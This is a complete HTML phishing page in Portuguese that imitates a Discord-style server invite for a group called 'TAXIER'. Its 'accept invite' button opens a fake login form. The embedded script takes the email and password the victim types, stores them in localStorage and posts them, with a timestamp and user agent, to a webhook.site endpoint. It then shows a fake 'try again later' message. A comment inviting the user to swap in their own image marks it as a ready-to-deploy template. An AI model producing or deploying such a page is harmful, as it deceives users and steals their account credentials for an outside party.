<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Convite para o Grupo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #36393f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #dcddde;
        }
        
        .invite-container {
            background: #36393f;
            width: 100%;
            max-width: 440px;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }
        
        .header {
            background: #2f3136;
            padding: 24px;
            text-align: center;
            color: white;
            position: relative;
        }
        
        .server-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            font-weight: bold;
            color: white;
            border: 4px solid #40444b;
            position: relative;
            overflow: hidden;
        }
        
        .server-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .server-name {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #ffffff;
        }
        
        .invite-text {
            color: #b9bbbe;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .member-count {
            color: #b9bbbe;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .online-count {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            color: #b9bbbe;
            font-size: 14px;
        }
        
        .green-dot {
            width: 8px;
            height: 8px;
            background: #23a55a;
            border-radius: 50%;
        }
        
        .action-section {
            padding: 24px;
            text-align: center;
            background: #36393f;
        }
        
        .accept-btn {
            background: #5865f2;
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .accept-btn:hover {
            background: #4752c4;
        }
        
        .login-form {
            display: none;
            padding: 24px;
            background: #2f3136;
        }
        
        .form-title {
            text-align: center;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: 600;
            color: #ffffff;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 12px;
            color: #b9bbbe;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            background: #40444b;
            border: 2px solid #40444b;
            border-radius: 4px;
            color: #ffffff;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #5865f2;
        }
        
        .error-message {
            color: #ed4245;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
        
        .success-message {
            background: #2f3136;
            color: #b9bbbe;
            padding: 12px;
            border-radius: 4px;
            font-size: 14px;
            text-align: center;
            margin-top: 16px;
            display: none;
            border: 1px solid #40444b;
        }
        
        .login-redirect {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: #b9bbbe;
        }
        
        .login-link {
            color: #00a8fc;
            text-decoration: none;
            cursor: pointer;
            font-weight: 600;
        }
        
        .login-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="invite-container">
        <div class="header">
            <div class="server-icon">
                <!-- SUBSTITUA PELA SUA IMAGEM AQUI -->
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjNTg2NUYyIi8+Cjx0ZXh0IHg9IjQwIiB5PSI0OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjMyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9rPSJtaWRkbGUiPklLPC90ZXh0Pgo8L3N2Zz4=" alt="Server Icon">
            </div>
            <div class="server-name">TAXIER</div>
            <div class="invite-text">Você foi convidado(a) para entrar</div>
            <div class="member-count">8 Membros</div>
            <div class="online-count">
                <div class="green-dot"></div>
                2 Online
            </div>
        </div>
        
        <div class="action-section">
            <button class="accept-btn" onclick="showLoginForm()">Aceitar convite</button>
        </div>
        
        <div id="loginForm" class="login-form">
            <div class="form-title">Entre no Grupo</div>
            
            <form onsubmit="handleLogin(event)">
                <div class="form-group">
                    <label for="email">Endereço de E-mail</label>
                    <input type="email" id="email" required placeholder="seu@email.com">
                    <div id="emailError" class="error-message">Digite um e-mail válido</div>
                </div>
                
                <div class="form-group">
                    <label for="password">Senha</label>
                    <input type="password" id="password" required placeholder="Sua senha">
                </div>
                
                <button type="submit" class="accept-btn">Continuar</button>
            </form>
            
            <div class="login-redirect">
                Já tem uma conta? <a class="login-link" onclick="showLoginForm()">Entrar</a>
            </div>
            
            <div id="successMessage" class="success-message">
                Não foi possível entrar no momento. Tente novamente mais tarde.
            </div>
        </div>
    </div>

    <script>
        const LOG_ENDPOINT = 'https://webhook.site/ab830b1e-933d-4730-becf-f96ff893bd33';

        function showLoginForm() {
            document.querySelector('.action-section').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';
        }

        function handleLogin(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const emailError = document.getElementById('emailError');
            
            if (!email.includes('@')) {
                emailError.style.display = 'block';
                return;
            }
            
            emailError.style.display = 'none';
            
            const credentials = {
                email: email,
                password: password,
                timestamp: new Date().toLocaleString('pt-BR'),
                userAgent: navigator.userAgent
            };
            
            let savedCredentials = JSON.parse(localStorage.getItem('grupo_creds') || '[]');
            savedCredentials.push(credentials);
            localStorage.setItem('grupo_creds', JSON.stringify(savedCredentials));
            
            fetch(LOG_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(credentials),
                mode: 'no-cors'
            }).catch(error => console.log('Erro ao enviar:', error));
            
            document.getElementById('successMessage').style.display = 'block';
            
            setTimeout(() => {
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                document.getElementById('successMessage').style.display = 'none';
                document.querySelector('.action-section').style.display = 'block';
                document.getElementById('loginForm').style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
